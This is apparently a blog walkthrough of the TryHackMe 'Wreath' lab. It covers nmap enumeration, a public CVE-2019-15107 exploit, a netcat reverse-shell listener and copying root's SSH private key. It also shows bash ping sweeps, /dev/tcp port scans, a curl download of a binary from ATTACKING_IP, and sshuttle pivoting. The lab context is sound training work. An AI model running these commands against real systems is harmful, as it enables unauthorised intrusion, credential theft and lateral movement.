+++
date = '2024-11-18T21:56:18+01:00'
draft = false
title = 'Wreath Walkthrough'
tags = ["TryHackMe"]
+++

# Enumeration

Nmap scan for open ports

```
nmap -p-15000 -vv 10.200.81.200
```

Nmap scan for OS recognition through headers

```
nmap -vv 10.200.81.200 --script=http-headers
```

# Exploitation

Once vulnerability is found, download script from github.

```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
```

For python pip install:

```
sudo apt install python3-pip
```

If privileges are missing use:

```
chmod +x yourfile.py
```

Now we can open the reverse shell:

![](/images/wreath/wreath1.png)

Set up netcat listener to catch reverse shell.

```
nc -lvnp 4444
```

Use rlwrap to stabilise the shell.

Now lets get ssh credentials since we won't be able to crack password hash.

Go to: root/.ssh/id\_rsa

Copy the content of the file to another and use the following command to log through ssh

```
ssh -i key.txt root@ip
```

# Pivoting

Important paths:

File with DNS entries: /etc/resolv.conf

Windows hosts: C:\Windows\System32\drivers\etc\hosts

To enumerate the network when nmap or other tools are not installed we should use the following.

Bash ping to analyze the alive connections.

```
for i in {1..255}; do (ping -c 1 10.200.81.${i} | grep "bytes from" &); done
```

We found new host at 10.200.81.250.

Another ping for port enumeration of the network.

```
for i in {1..65535}; do (echo > /dev/tcp/10.200.81.250/$i) >/dev/null 2>&1 && echo $i is open; done
```

Now we are going to transfer a static nmap binary to the machine so we can pivot the network.

Once downloaded start python web server.

```
sudo python3 -m http.server 80
```

```
curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME
```

This way we get the nmap binary on  the machine.

```
.nmap-puursuit -sn 10.200.81.1-255 -oN scan-puursuit
```

We found 100 and 150 accessible, now we perform another scan on them for open ports.

```
./nmap-puursuit -sS 10.200.81.100
./nmap-puursuit -sS 10.200.81.150
```

We have discovered the http service running on port 80 on the .150 machine.

Let's use sshuttle to pivote through the network.

```
sshuttle -r root@10.200.81.200 --ssh-cmd "ssh -i sshkey.txt" 10.200.81.200/24 -x 10.200.81.200
```